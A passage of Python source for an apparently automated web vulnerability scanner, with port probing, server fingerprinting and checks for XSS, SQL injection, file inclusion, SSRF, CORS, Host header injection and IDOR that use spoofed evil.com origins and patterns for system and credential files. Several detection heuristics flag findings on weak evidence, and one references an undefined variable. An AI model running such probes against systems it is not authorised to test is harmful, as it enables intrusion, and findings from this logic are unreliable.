                    _, headers, _, _ = result
                    
                    indicators = []
                    confidence = 'Low'
                    os_guess = 'Unknown'
                    
                    # Server header analysis
                    server = headers.get('Server', headers.get('server', '')).lower()
                    if server:
                        indicators.append(f"Server: {server[:30]}")
                        
                        if 'iis' in server or 'microsoft' in server or 'aspnet' in server:
                            os_guess = 'Windows Server'
                            confidence = 'High'
                        elif 'apache' in server:
                            # Check for OS hints in Apache version
                            if 'ubuntu' in server:
                                os_guess = 'Ubuntu Linux'
                                confidence = 'High'
                            elif 'debian' in server:
                                os_guess = 'Debian Linux'
                                confidence = 'High'
                            elif 'centos' in server or 'red hat' in server:
                                os_guess = 'CentOS/RHEL'
                                confidence = 'High'
                            elif 'unix' in server:
                                os_guess = 'Unix'
                                confidence = 'Medium'
                            else:
                                os_guess = 'Linux/Unix'
                                confidence = 'Medium'
                        elif 'nginx' in server:
                            os_guess = 'Linux'
                            confidence = 'Medium'
                        elif 'cloudflare' in server or 'cloudfront' in server:
                            os_guess = 'Behind CDN'
                            confidence = 'Low'
                    
                    # X-Powered-By analysis
                    powered_by = headers.get('X-Powered-By', headers.get('x-powered-by', '')).lower()
                    if powered_by:
                        indicators.append(f"X-Powered-By: {powered_by[:30]}")
                        if 'asp.net' in powered_by and os_guess == 'Unknown':
                            os_guess = 'Windows Server'
                            confidence = 'Medium'
                        elif 'php' in powered_by and os_guess == 'Unknown':
                            os_guess = 'Linux'
                            confidence = 'Low'
                    
                    # Additional headers
                    if 'X-AspNet-Version' in headers or 'X-AspNetMvc-Version' in headers:
                        os_guess = 'Windows Server'
                        confidence = 'High'
                        indicators.append('ASP.NET headers present')
                    
                    os_hints = {
                        'guess': os_guess,
                        'confidence': confidence,
                        'indicators': indicators[:5]
                    }
            except:
                pass
            
            recon_data['advanced_analysis']['os_fingerprint'] = os_hints
            
            # 17. Common Open Ports Check (limited list for performance)
            if recon_data['dns_records'].get('A'):
                import socket
                ip = recon_data['dns_records']['A'][0]
                common_ports = [21, 22, 23, 25, 80, 443, 3306, 3389, 5432, 8080, 8443]
                open_ports = []
                
                for port in common_ports[:8]:  # Limit to avoid slowdown
                    try:
                        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        sock.settimeout(1)
                        result = sock.connect_ex((ip, port))
                        if result == 0:
                            open_ports.append(port)
                        sock.close()
                    except:
                        pass
                
                recon_data['advanced_analysis']['open_ports'] = open_ports if open_ports else ['None detected in common range']
            
            # 18. MODERN: Advanced HTTP Response Analysis
            try:
                result = await self.session.get(url)
                if result[0] is not None:
                    status, headers, content, final_url = result
                    
                    # HTTP/2 Support Detection
                    recon_data['advanced_analysis']['http2_support'] = headers.get('alt-svc') is not None or ':scheme' in str(headers)
                    
                    # Server Tokens & Version Leakage
                    recon_data['advanced_analysis']['server_tokens'] = {
                        'server': headers.get('Server', 'Not disclosed'),
                        'x_powered_by': headers.get('X-Powered-By', 'Not disclosed'),
                        'x_aspnet_version': headers.get('X-AspNet-Version', 'Not disclosed'),
                        'x_aspnetmvc_version': headers.get('X-AspNetMvc-Version', 'Not disclosed'),
                        'x_generator': headers.get('X-Generator', 'Not disclosed')
                    }
                    
                    # Compression Methods
                    compression = headers.get('Content-Encoding', 'none')
                    recon_data['advanced_analysis']['compression_methods'] = compression.split(', ') if compression != 'none' else []
                    
                    # Cache Configuration
                    recon_data['advanced_analysis']['cache_config'] = {
                        'cache_control': headers.get('Cache-Control', 'Not set'),
                        'expires': headers.get('Expires', 'Not set'),
                        'etag': headers.get('ETag', 'Not set'),
                        'last_modified': headers.get('Last-Modified', 'Not set')
                    }
                    
                    # Resource Hints (preconnect, prefetch, dns-prefetch)
                    if content and BS4_AVAILABLE:
                        try:
                            soup = BeautifulSoup(content, 'html.parser')
                            hints = {
                                'preconnect': [link.get('href') for link in soup.find_all('link', rel='preconnect')],
                                'dns_prefetch': [link.get('href') for link in soup.find_all('link', rel='dns-prefetch')],
                                'prefetch': [link.get('href') for link in soup.find_all('link', rel='prefetch')]
                            }
                            recon_data['advanced_analysis']['resource_hints'] = hints
                        except:
                            pass
                    
                    # HTTP Fingerprint (create unique hash)
                    if HASH_AVAILABLE:
                        header_string = ''.join(f"{k}:{v}" for k, v in sorted(headers.items())[:10])
                        fingerprint = hashlib.md5(header_string.encode()).hexdigest()[:16]
                        recon_data['advanced_analysis']['http_fingerprint'] = fingerprint
            except:
                pass
            
            # 19. MODERN: Enhanced TLS/SSL Cipher Analysis - IMPROVED
            if parsed.scheme == 'https':
                cipher_info = {'cipher_name': 'Unknown', 'protocol_version': 'Unknown', 'cipher_bits': 0}
                try:
                    import socket
                    import ssl as ssl_lib
                    
                    port = parsed.port if parsed.port else 443
                    
                    # Try with default context first
                    try:
                        context = ssl_lib.create_default_context()
                        with socket.create_connection((domain, port), timeout=6) as sock:
                            with context.wrap_socket(sock, server_hostname=domain) as ssock:
                                cipher = ssock.cipher()
                                if cipher and len(cipher) >= 3:
                                    cipher_info = {
                                        'cipher_name': cipher[0],
                                        'protocol_version': cipher[1],
                                        'cipher_bits': cipher[2]
                                    }
                                
                                # Certificate Chain
                                try:
                                    cert_chain = ssock.getpeercert(binary_form=False)
                                    if cert_chain:
                                        recon_data['advanced_analysis']['certificate_chain'] = [cert_chain]
                                except:
                                    recon_data['advanced_analysis']['certificate_chain'] = []
                    except:
                        # Fallback: Try with less strict SSL context
                        try:
                            context = ssl_lib.SSLContext(ssl_lib.PROTOCOL_TLS_CLIENT)
                            context.check_hostname = False
                            context.verify_mode = ssl_lib.CERT_NONE
                            
                            with socket.create_connection((domain, port), timeout=6) as sock:
                                with context.wrap_socket(sock, server_hostname=domain) as ssock:
                                    cipher = ssock.cipher()
                                    if cipher and len(cipher) >= 3:
                                        cipher_info = {
                                            'cipher_name': cipher[0],
                                            'protocol_version': cipher[1],
                                            'cipher_bits': cipher[2]
                                        }
                        except:
                            pass
                    
                    recon_data['advanced_analysis']['tls_cipher_analysis'] = cipher_info
                except Exception as e:
                    recon_data['advanced_analysis']['tls_cipher_analysis'] = {
                        'cipher_name': 'Detection failed',
                        'protocol_version': str(e)[:30],
                        'cipher_bits': 0
                    }
            else:
                recon_data['advanced_analysis']['tls_cipher_analysis'] = {
                    'cipher_name': 'Not HTTPS',
                    'protocol_version': 'N/A',
                    'cipher_bits': 0
                }
            
            # 20. MODERN: CDN Detection (Enhanced)
            cdn_indicators = {
                'cloudflare': ['__cfduid', 'cf-ray', 'cloudflare'],
                'akamai': ['akamai', 'edgekey', 'edgesuite'],
                'fastly': ['fastly', 'x-fastly'],
                'cloudfront': ['cloudfront', 'x-amz-cf-id'],
                'maxcdn': ['maxcdn', 'netdna'],
                'incapsula': ['incapsula', 'x-cdn'],
                'sucuri': ['sucuri', 'x-sucuri']
            }
            
            detected_cdn = 'None'
            try:
                result = await self.session.get(url)
                if result[0] is not None:
                    _, headers, content, _ = result
                    header_str = str(headers).lower()
                    content_str = content.lower() if content else ''
                    
                    for cdn, indicators in cdn_indicators.items():
                        if any(ind in header_str or ind in content_str for ind in indicators):
                            detected_cdn = cdn.title()
                            break
            except:
                pass
            
            recon_data['advanced_analysis']['cdn_detection'] = {'cdn_provider': detected_cdn}
            
            # 21. MODERN: Cloud Provider Detection
            cloud_providers = {
                'AWS': ['amazonaws.com', 's3.', 'ec2', 'cloudfront'],
                'Azure': ['azure', 'windows.net', 'azurewebsites'],
                'GCP': ['googleapis.com', 'googleusercontent.com', 'appspot.com'],
                'DigitalOcean': ['digitaloceanspaces.com', 'droplet'],
                'Heroku': ['herokuapp.com', 'herokussl.com']
            }
            
            detected_cloud = 'On-Premise/Unknown'
            ip_intelligence = recon_data.get('ip_intelligence', {})
            if ip_intelligence and isinstance(ip_intelligence, dict):
                isp_name = ip_intelligence.get('isp', '').lower()
                asn_desc = ip_intelligence.get('asn_description', '').lower()
                
                for provider, keywords in cloud_providers.items():
                    if any(kw in isp_name or kw in asn_desc for kw in keywords):
                        detected_cloud = provider
                        break
            
            recon_data['advanced_analysis']['cloud_provider'] = {'provider': detected_cloud}
            
            # 22. MODERN: API Endpoint Discovery
            api_endpoints = []
            try:
                result = await self.session.get(url)
                if result[0] is not None and BS4_AVAILABLE:
                    _, _, content, _ = result
                    if content:
                        soup = BeautifulSoup(content, 'html.parser')
                        scripts = soup.find_all('script')
                        for script in scripts[:20]:
                            script_content = script.string or ''
                            import re
                            api_patterns = re.findall(r'["\']([/]api/[a-zA-Z0-9/_-]+)["\']', script_content)
                            api_endpoints.extend(api_patterns[:5])
            except:
                pass
            
            recon_data['advanced_analysis']['api_endpoints'] = list(set(api_endpoints))[:10]
            
            # 23. MODERN: Enhanced Email Security (DKIM, BIMI)
            email_sec = recon_data['advanced_analysis']['spf_dmarc'].copy()
            try:
                if DNS_AVAILABLE:
                    resolver = dns.resolver.Resolver()
                    resolver.timeout = 2
                    
                    # DKIM (check common selectors)
                    dkim_selectors = ['default', 'google', 'k1', 'mail', 'selector1', 'selector2']
                    dkim_found = []
                    for selector in dkim_selectors[:3]:
                        try:
                            dkim_query = f"{selector}._domainkey.{domain}"
                            resolver.resolve(dkim_query, 'TXT')
                            dkim_found.append(selector)
                        except:
                            pass
                    
                    if dkim_found:
                        email_sec['dkim'] = f"Found ({', '.join(dkim_found)})"
                    else:
                        email_sec['dkim'] = 'Not found'
                    
                    # BIMI (Brand Indicators for Message Identification)
                    try:
                        bimi_query = f"default._bimi.{domain}"
                        resolver.resolve(bimi_query, 'TXT')
                        email_sec['bimi'] = 'Configured'
                    except:
                        email_sec['bimi'] = 'Not configured'
            except:
                pass
            
            recon_data['advanced_analysis']['email_security'] = email_sec
            
            # 24. MODERN: CSP Analysis
            try:
                result = await self.session.get(url)
                if result[0] is not None:
                    _, headers, _, _ = result
                    csp = headers.get('Content-Security-Policy', '')
                    if csp:
                        csp_directives = {}
                        for directive in csp.split(';')[:15]:
                            parts = directive.strip().split(' ', 1)
                            if len(parts) == 2:
                                csp_directives[parts[0]] = parts[1]
                        
                        recon_data['advanced_analysis']['csp_analysis'] = {
                            'configured': True,
                            'directives_count': len(csp_directives),
                            'unsafe_inline': "'unsafe-inline'" in csp,
                            'unsafe_eval': "'unsafe-eval'" in csp,
                            'key_directives': list(csp_directives.keys())[:10]
                        }
                    else:
                        recon_data['advanced_analysis']['csp_analysis'] = {'configured': False}
            except:
                recon_data['advanced_analysis']['csp_analysis'] = {'configured': False}
            
            # 25. MODERN: Redirect Chain Analysis
            redirect_chain = []
            try:
                current_url = url
                for _ in range(5):  # Max 5 redirects
                    result = await self.session.get(current_url)
                    if result[0] is not None:
                        status, headers, _, final_url = result
                        redirect_chain.append({'url': current_url, 'status': status})
                        if status in [301, 302, 303, 307, 308]:
                            location = headers.get('Location')
                            if location:
                                current_url = location if location.startswith('http') else urljoin(current_url, location)
                            else:
                                break
                        else:
                            break
                    else:
                        break
            except:
                pass
            
            recon_data['advanced_analysis']['redirect_chain'] = redirect_chain[:5]
            
            # 26. MODERN: WebSocket Support Detection
            try:
                result = await self.session.get(url)
                if result[0] is not None:
                    _, headers, _, _ = result
                    ws_support = 'upgrade' in headers.get('Connection', '').lower() or headers.get('Upgrade') == 'websocket'
                    recon_data['advanced_analysis']['websocket_support'] = ws_support
            except:
                pass
            
            # 27. MODERN: Response Timing Analysis
            timing = {}
            try:
                import time
                start = time.time()
                result = await self.session.get(url)
                timing['initial_response'] = int((time.time() - start) * 1000)
                
                start = time.time()
                result = await self.session.get(urljoin(url, '/nonexistent-page-12345'))
                timing['404_response'] = int((time.time() - start) * 1000)
                
                recon_data['advanced_analysis']['timing_analysis'] = timing
            except:
                pass
        
        except Exception as e:
            self.config.logger.debug(f"Advanced reconnaissance error: {e}")
        
        return recon_data


    async def check_vulnerability(self, url: str, check_type: str, payload: str) -> List[Dict]:
        """Optimized vulnerability check with early detection and smart shortcuts."""
        findings = []
        
        # Early return for null responses
        if check_type == 'sensitive_files':
            test_url = urljoin(url, payload)
        elif check_type in ['xxe', 'template_injection']:
            return await self._check_post_vulnerability(url, check_type, payload)
        else:
            test_url = f"{url}{'&' if '?' in url else '?'}param={quote(payload)}"
        
        try:
            result = await self.session.get(test_url)
            if result[0] is None:  # Failed request
                return []
                
            status, headers, content, final_url = result
            if not content:
                return []

            # Fast detection with early returns for performance
            content_lower = content.lower()
            
            # XSS Detection - Quick checks first
            if check_type == 'xss':
                if self._quick_detect_xss(payload, content, content_lower, headers):
                    findings.append(self._create_finding('XSS', 'HIGH', f"Reflected XSS: {payload}", test_url))

            # SQL Injection - Priority patterns first
            elif check_type == 'sqli':
                if self._quick_detect_sqli(payload, content, content_lower, headers, status):
                    severity = 'CRITICAL' if any(x in payload.upper() for x in ['UNION', 'DROP', 'DELETE']) else 'HIGH'
                    findings.append(self._create_finding('SQLi', severity, f"SQL injection: {payload}", test_url))

            # LFI - Fast file indicators
            elif check_type == 'lfi':
                if self._quick_detect_lfi(payload, content, content_lower, headers):
                    findings.append(self._create_finding('LFI', 'CRITICAL', f"Local File Inclusion: {payload}", test_url))

            # Other vulnerability types with optimized detection
            elif check_type == 'rfi':
                # ADVANCED RFI Detection with dynamic analysis
                if self._detect_rfi(payload, content, headers, status):
                    findings.append(self._create_finding('RFI', 'CRITICAL', f"Remote File Inclusion: {payload}", test_url))

            elif check_type == 'cmd_injection':
                if self._quick_detect_command_injection(payload, content, content_lower):
                    findings.append(self._create_finding('OS Command Injection', 'CRITICAL', f"Command injection: {payload}", test_url))

            elif check_type == 'ssrf':
                if self._quick_detect_ssrf(payload, content, content_lower, status, final_url, url):
                    severity = 'CRITICAL' if any(x in payload for x in ['metadata', '169.254.169.254']) else 'HIGH'
                    findings.append(self._create_finding('SSRF', severity, f"SSRF to: {payload}", test_url))

            elif check_type == 'sensitive_files' and status == 200:
                if self._quick_detect_sensitive_file(payload, content, content_lower):
                    severity = 'CRITICAL' if payload in ['.env', '.git/config', 'id_rsa'] else 'HIGH'
                    findings.append(self._create_finding('Sensitive File Exposure', severity, f"Exposed file: {payload}", test_url))

            # Fast checks for other injection types
            elif check_type == 'nosql_injection' and self._quick_detect_nosql(payload, content_lower, status):
                findings.append(self._create_finding('NoSQL Injection', 'HIGH', f"NoSQL injection: {payload}", test_url))
            
            elif check_type == 'ldap_injection' and self._quick_detect_ldap(content_lower):
                findings.append(self._create_finding('LDAP Injection', 'HIGH', f"LDAP injection: {payload}", test_url))
            
            elif check_type == 'xpath_injection' and self._quick_detect_xpath(content_lower):
                findings.append(self._create_finding('XPath Injection', 'HIGH', f"XPath injection: {payload}", test_url))

            elif check_type == 'open_redirect' and self._quick_detect_open_redirect(payload, headers, status):
                findings.append(self._create_finding('Open Redirect', 'MEDIUM', f"Open redirect: {payload}", test_url))

            elif check_type == 'crlf_injection' and self._quick_detect_crlf(payload, headers):
                findings.append(self._create_finding('CRLF Injection', 'HIGH', f"CRLF injection: {payload}", test_url))

            # ═══════════════════════════════════════════════════════════════════════════
            # 🔥 ADVANCED DYNAMIC CHECKS - JWT, GraphQL, CORS, CSV, Deserialization, etc.
            # ═══════════════════════════════════════════════════════════════════════════
            
            # JWT Vulnerability Detection
            elif check_type == 'jwt':
                jwt_vulns = self._detect_jwt_vulnerabilities(headers, '', content)
                for jwt_vuln in jwt_vulns:
                    findings.append(self._create_finding(
                        jwt_vuln['type'], 
                        jwt_vuln['severity'], 
                        jwt_vuln['details'], 
                        test_url
                    ))
            
            # GraphQL Injection Detection
            elif check_type == 'graphql_injection':
                if self._detect_graphql_injection(payload, content, headers, status):
                    findings.append(self._create_finding(
                        'GraphQL Injection', 
                        'HIGH', 
                        f"GraphQL injection: {payload}", 
                        test_url
                    ))
            
            # CSV Injection Detection
            elif check_type == 'csv_injection':
                if self._detect_csv_injection(payload, content, headers):
                    findings.append(self._create_finding(
                        'CSV Injection', 
                        'MEDIUM', 
                        f"CSV formula injection: {payload}", 
                        test_url
                    ))
            
            # HTTP Request Smuggling Detection
            elif check_type == 'http_smuggling':
                if self._detect_http_request_smuggling(headers, status, content):
                    findings.append(self._create_finding(
                        'HTTP Request Smuggling', 
                        'CRITICAL', 
                        'HTTP request smuggling vulnerability detected', 
                        test_url
                    ))
            
            # Insecure Deserialization Detection
            elif check_type == 'deserialization':
                if self._detect_insecure_deserialization(content, headers, payload):
                    findings.append(self._create_finding(
                        'Insecure Deserialization', 
                        'CRITICAL', 
                        f"Insecure deserialization: {payload}", 
                        test_url
                    ))

        except Exception as e:
            self.config.logger.debug(f"Error checking {check_type} on {test_url}: {e}")
        return findings
    
    async def check_cors(self, url: str) -> List[Dict]:
        """Check for CORS misconfigurations with advanced origin testing."""
        findings = []
        
        # Test with multiple malicious origins
        test_origins = [
            'https://evil.com',
            'null',
            'https://attacker.com',
            'https://sub.evil.com',
            url.replace('https://', 'https://evil-')  # Subdomain hijack attempt
        ]
        
        for origin in test_origins:
            try:
                # Send request with crafted Origin header
                status, headers, content, final_url = await self.session.get(
                    url, 
                    extra_headers={'Origin': origin}
                )
                
                if headers and self._detect_cors_misconfiguration(headers, origin):
                    findings.append(self._create_finding(
                        'CORS Misconfiguration', 
                        'HIGH', 
                        f'Insecure CORS policy allows origin: {origin}', 
                        url
                    ))
                    break  # Found one, that's enough
            except Exception as e:
                self.config.logger.debug(f"CORS check failed for {url} with origin {origin}: {e}")
        
        return findings
    
    async def check_host_header_injection(self, url: str) -> List[Dict]:
        """Check for Host header injection vulnerabilities."""
        findings = []
        
        # Extract original host
        from urllib.parse import urlparse
        parsed = urlparse(url)
        original_host = parsed.netloc
        
        # Test with malicious hosts
        test_hosts = [
            'evil.com',
            'attacker.com',
            '127.0.0.1',
            'localhost',
            'metadata.google.internal'  # GCP SSRF attempt
        ]
        
        for injected_host in test_hosts:
            try:
                status, headers, content, final_url = await self.session.get(
                    url,
                    extra_headers={'Host': injected_host}
                )
                
                if content and self._detect_host_header_injection(
                    original_host, injected_host, content, headers or {}
                ):
                    findings.append(self._create_finding(
                        'Host Header Injection', 
                        'HIGH', 
                        f'Host header injection with: {injected_host}', 
                        url
                    ))
                    break
            except Exception as e:
                self.config.logger.debug(f"Host header injection check failed: {e}")
        
        return findings
    
    async def check_idor(self, url: str) -> List[Dict]:
        """Check for IDOR (Insecure Direct Object Reference) vulnerabilities."""
        findings = []
        import re
        
        # Extract IDs from URL
        id_patterns = [
            (r'/users?/(\d+)', 'user'),
            (r'/accounts?/(\d+)', 'account'),
            (r'/profiles?/(\d+)', 'profile'),
            (r'/documents?/(\d+)', 'document'),
            (r'/files?/(\d+)', 'file'),
            (r'/orders?/(\d+)', 'order'),
            (r'[?&]id=(\d+)', 'id'),
            (r'[?&]user_id=(\d+)', 'user_id'),
            (r'[?&]account=(\d+)', 'account'),
        ]
        
        current_id = None
        param_type = None
        pattern_used = None
        
        for pattern, ptype in id_patterns:
            match = re.search(pattern, url, re.IGNORECASE)
            if match:
                current_id = match.group(1)
                param_type = ptype
                pattern_used = pattern
                break
        
        if not current_id:
            return findings  # No ID found in URL
        
        # Get original response
        try:
            original_status, original_headers, original_content, _ = await self.session.get(url)
            
            if original_status != 200 or not original_content:
                return findings  # Can't test IDOR without baseline
            
            # Test with modified IDs
            test_ids = []
            current_id_int = int(current_id)
            
            # Generate test IDs: adjacent, random, common
            test_ids = [
                str(current_id_int + 1),
                str(current_id_int - 1),
                str(current_id_int + 10),
                '1',  # Common ID
                '2',
                '100',
                '999',
            ]
            
            test_responses = {}
            status_codes = {}
            
            for test_id in test_ids:
                if test_id == current_id:
                    continue
                
                # Replace ID in URL
                test_url = re.sub(pattern_used, lambda m: m.group(0).replace(current_id, test_id), url)
                
                try:
                    status, headers, content, _ = await self.session.get(test_url)
                    test_responses[test_id] = content
                    status_codes[test_id] = status
                    
                    # Small delay to avoid rate limiting
                    await asyncio.sleep(0.1)
                except Exception as e:
                    self.config.logger.debug(f"IDOR test failed for ID {test_id}: {e}")
            
            # Analyze responses for IDOR
            if self._detect_idor(url, original_content, test_responses, status_codes):
                findings.append(self._create_finding(
                    'IDOR (Insecure Direct Object Reference)',
                    'HIGH',
                    f'IDOR vulnerability detected - unauthorized access to {param_type} objects',
                    url
                ))
        
        except Exception as e:
            self.config.logger.debug(f"IDOR check failed for {url}: {e}")
        
        return findings



    # Quick detection methods optimized for speed - TRULY DYNAMIC
    def _quick_detect_xss(self, payload: str, content: str, content_lower: str, headers: Dict) -> bool:
        """Fast XSS detection with priority checks - DYNAMIC reflection analysis."""
        import html
        import urllib.parse
        
        # Dynamic reflection analysis - check multiple encoding formats
        # 1. Direct reflection (unmodified)
        if payload in content:
            return True
        
        # 2. URL-encoded reflection
        url_encoded = urllib.parse.quote(payload)
        if url_encoded in content:
            return True
        
        # 3. HTML entity encoded
        html_encoded = html.escape(payload)
        if html_encoded in content:
            return True
        
        # 4. Double URL-encoded
        double_encoded = urllib.parse.quote(url_encoded)
        if double_encoded in content:
            return True
        
        # 5. Partial payload reflection (dynamic substring matching)
        if len(payload) > 10:
            # Check if significant portions of payload are reflected
            for i in range(0, len(payload) - 5, 3):
                substring = payload[i:i+5]
                if len(substring) >= 5 and substring in content:
                    # Further validate with XSS context
                    context_around = self._extract_reflection_context(content, substring)
                    if self._is_dangerous_xss_context(context_around):
                        return True
        
        # 6. Check for dynamic script execution indicators based on payload type
        dangerous_contexts = [
            '<script', '</script>', 'javascript:', 'onerror=', 'onload=', 
            'onclick=', 'onmouseover=', 'onfocus=', 'onblur=', 'oninput=',
            'alert(', 'confirm(', 'prompt(', 'eval(', 'document.cookie',
            'window.location', 'document.write', 'innerhtml'
        ]
        
        # Dynamic pattern matching - look for ANY dangerous context near our payload markers
        for indicator in dangerous_contexts:
            if indicator in content_lower:
                # Check if it's related to our input (within 100 chars)
                marker_pos = content_lower.find(indicator)
                if marker_pos != -1:
                    context = content_lower[max(0, marker_pos-50):min(len(content_lower), marker_pos+50)]
                    # Check for parameter names or common injection points
                    if any(param in context for param in ['param', 'input', 'search', 'q', 'query', 'value']):
                        return True
        
        # 7. Check CSP bypass indicators
        csp_header = headers.get('content-security-policy', '').lower()
        if not csp_header or 'unsafe-inline' in csp_header or 'unsafe-eval' in csp_header:
            # No CSP or weak CSP makes XSS more likely
            if any(tag in content_lower for tag in ['<input', '<textarea', '<form']):
                return True
        
        return False
    
    def _extract_reflection_context(self, content: str, substring: str) -> str:
        """Extract context around reflected content for analysis."""
        pos = content.find(substring)
        if pos != -1:
            start = max(0, pos - 30)
            end = min(len(content), pos + len(substring) + 30)
            return content[start:end]
        return ""
    
    def _is_dangerous_xss_context(self, context: str) -> bool:
        """Check if reflection context is dangerous for XSS."""
        context_lower = context.lower()
        dangerous_tags = ['<script', '<iframe', '<object', '<embed', '<svg', '<math']
        dangerous_attrs = ['onerror=', 'onload=', 'onclick=', 'href="javascript:', 'src="javascript:']
        
        return any(tag in context_lower for tag in dangerous_tags) or \
               any(attr in context_lower for attr in dangerous_attrs)

    def _quick_detect_sqli(self, payload: str, content: str, content_lower: str, headers: Dict, status: int) -> bool:
        """Fast SQL injection detection with priority patterns - DYNAMIC error analysis."""
        import re
        
        # 1. Dynamic database error signature detection
        # Comprehensive database error patterns with dynamic matching
        db_error_patterns = {
            'mysql': [
                r"mysql.*error", r"warning.*mysql", r"mysql_fetch", 
                r"num_rows", r"mysql_query", r"supplied argument",
                r"mysql_error", r"mysqlclient", r"mysql syntax"
            ],
            'postgresql': [
                r"pg_query", r"pg_exec", r"postgresql.*error",
                r"psql.*error", r"unterminated.*quoted", r"syntax error.*position"
            ],
            'mssql': [
                r"microsoft sql", r"odbc sql", r"sqlstate",
                r"microsoft ole db", r"sql server", r"unclosed quotation"
            ],
            'oracle': [
                r"ora-\d{5}", r"oracle.*error", r"oracle.*warning",
                r"quoted string not properly terminated"
            ],
            'sqlite': [
                r"sqlite.*error", r"sqlite3.*operationalerror",
                r"near.*syntax error"
            ]
        }
        
        # Check for database-specific errors
        for db_type, patterns in db_error_patterns.items():
            for pattern in patterns:
                if re.search(pattern, content_lower):
                    return True
        
        # 2. SQL syntax error patterns (database-agnostic)
        sql_syntax_errors = [
            r"syntax error.*sql", r"unexpected end of sql",
            r"unterminated string", r"quoted string not properly",
            r"you have an error in your sql", r"check the manual",
            r"incorrect syntax near", r"unclosed quotation mark"
        ]
        
        for pattern in sql_syntax_errors:
            if re.search(pattern, content_lower):
                return True
        
        # 3. Dynamic SQL injection evidence - time-based blind
        if any(marker in payload.upper() for marker in ['SLEEP', 'WAITFOR', 'BENCHMARK', 'PG_SLEEP']):
            # Check for delayed response (handled elsewhere, just mark as suspicious)
            return True
        
        # 4. Union-based SQLi detection
        if 'UNION' in payload.upper() and 'SELECT' in payload.upper():
            # Check for data leakage or table structure exposure
            if re.search(r'(table|column|database|version|user|admin)', content_lower):
                return True
        
        # 5. Boolean-based blind SQLi indicators
        # Check if response differs significantly for true/false conditions
        if any(marker in payload.upper() for marker in ['AND', 'OR', '1=1', '1=2']):
            # If status is 200 and content has changed, might be SQLi
            if status == 200 and len(content) > 50:
                return True
        
        # 6. Error-based SQLi - check for information disclosure
        info_disclosure_patterns = [
            r'table.*does.*not.*exist', r'column.*not.*found',
            r'database.*error', r'query.*failed', r'sql.*exception'
        ]
        
        for pattern in info_disclosure_patterns:
            if re.search(pattern, content_lower):
                return True
        
        return False
    
    def _quick_detect_lfi(self, payload: str, content: str, content_lower: str, headers: Dict) -> bool:
        """Fast LFI detection with file content indicators - DYNAMIC file signature detection."""
        import re
        
        # 1. Dynamic Unix/Linux file signature detection
        unix_patterns = [
            # /etc/passwd signatures
            r"root:.*:0:0:", r"daemon:.*:.*:", r"bin:.*:.*:", r"sys:.*:.*:",
            r"nobody:.*:.*:", r"www-data:.*:.*:",
            # Shell indicators
            r"/bin/bash", r"/bin/sh", r"/bin/zsh", r"/bin/false", r"/sbin/nologin",
            # System file patterns
            r"\[boot loader\]", r"\[operating systems\]", r"multi\(0\)disk\(0\)",
            # Config file patterns
            r"\[global\]", r"kernel\..*=", r"net\..*=",
            # Common system paths
            r"/etc/.*", r"/var/.*", r"/usr/.*", r"/home/.*"
        ]
        
        for pattern in unix_patterns:
            if re.search(pattern, content_lower, re.IGNORECASE):
                return True
        
        # 2. Dynamic Windows file signature detection
        windows_patterns = [
            r"\[boot loader\]", r"\[operating systems\]",
            r"c:\\windows", r"c:\\winnt", r"c:\\users",
            r"systemroot", r"windir", r"programfiles",
            r"boot\.ini", r"win\.ini", r"system\.ini",
            r"\\system32\\", r"\\syswow64\\"
        ]
        
        for pattern in windows_patterns:
            if re.search(pattern, content_lower, re.IGNORECASE):
                return True
        
        # 3. Dynamic configuration file detection
        config_patterns = [
            # Database configs
            r"mysql_connect", r"mysqli_connect", r"pg_connect", r"oracle_connect",
            r"database_host", r"db_password", r"db_username", r"db_name",
            # Application configs  
            r"define\(.*['\"](DB|DATABASE)", r"\$db", r"\$database",
            r"secret_key\s*=", r"api_key\s*=", r"password\s*=",
            # PHP configuration
            r"<\?php", r"phpinfo\(\)", r"ini_set\(",
            # Web server configs
            r"rewriteengine", r"rewriterule", r"<virtualhost",
            r"servername", r"documentroot"
        ]
        
        for pattern in config_patterns:
            if re.search(pattern, content_lower, re.IGNORECASE):
                return True
        
        # 4. Behavioral analysis - check if response changed significantly
        # If we're getting file-like content, it should have certain characteristics
        if len(content) > 100:  # Substantial content
            # Check for file-like structure
            line_count = content.count('\n')
            if line_count > 10:  # Multi-line content like files
                # Check for common file markers
                file_markers = ['#', '//', '/*', '<!--', '[', '{', 'root:', 'user:', 'admin:']
                marker_count = sum(1 for marker in file_markers if marker in content_lower)
                if marker_count >= 2:
                    return True
        
        # 5. Check for directory traversal success indicators
        traversal_indicators = ['../../../', '..\\..\\..\\', '%2e%2e%2f', '%2e%2e%5c']
        if any(ind in payload.lower() for ind in traversal_indicators):
            # Check if we got unexpected content type
            content_type = headers.get('content-type', '').lower()
            expected_types = ['text/html', 'application/json', 'application/xml']
            if content_type and not any(t in content_type for t in expected_types):
                # Got unusual content type after traversal attempt
                if 'text/plain' in content_type or 'application/octet-stream' in content_type:
                    return True
        
        # 6. Check for PHP wrapper success (php:// filter)
        if 'php://' in payload.lower():
            # Check for base64 encoded content (common with php://filter)
            if re.search(r'[A-Za-z0-9+/]{50,}={0,2}', content):
                return True
            # Check for converted content
            if 'convert.base64' in payload.lower() and len(content) > 50:
                return True
        
        # 7. Dynamic null byte detection (legacy but still effective)
        if '%00' in payload or '\x00' in payload:
            if len(content) > 50 and content_type.startswith('text/'):
                # Null byte might have terminated filename check
                return True
        
        # 8. Check for source code disclosure
        source_indicators = [
            r"<\?php", r"<\?=", r"require_once", r"include_once",
            r"function\s+\w+\s*\(", r"class\s+\w+",
            r"import\s+\w+", r"from\s+\w+\s+import",
            r"def\s+\w+\s*\(", r"public\s+class"
        ]
        
        for pattern in source_indicators:
            if re.search(pattern, content, re.IGNORECASE):
                return True
        
        return False
    
    def _quick_detect_command_injection_OLD(self, payload: str, content: str, content_lower: str) -> bool:
        """Fast command injection detection - DYNAMIC system command output analysis."""
        import re
        
        # 1. Dynamic command output pattern detection
        # Unix command outputs
        unix_cmd_patterns = [
            # id command
            r"uid=\d+\([\w-]+\)", r"gid=\d+\([\w-]+\)", r"groups=\d+",
            # whoami  
            r"(root|www-data|apache|nginx|nobody)\s*$", r"^\w+\s*$",
            # uname
            r"linux", r"darwin", r"freebsd", r"kernel.*\d+\.\d+",
            # ls command
            r"total\s+\d+", r"[drwx-]{10}", r"[drwx-]{10}\s+\d+",
            # pwd
            r"^/[\w/]+$", r"^[a-z]:\\.*$",
            # ps command  
            r"PID\s+TTY", r"\d+\s+pts/\d+", r"TIME\s+CMD",
            # ifconfig/ip
            r"inet\s+\d+\.\d+\.\d+\.\d+", r"ether\s+[0-9a-f:]+",
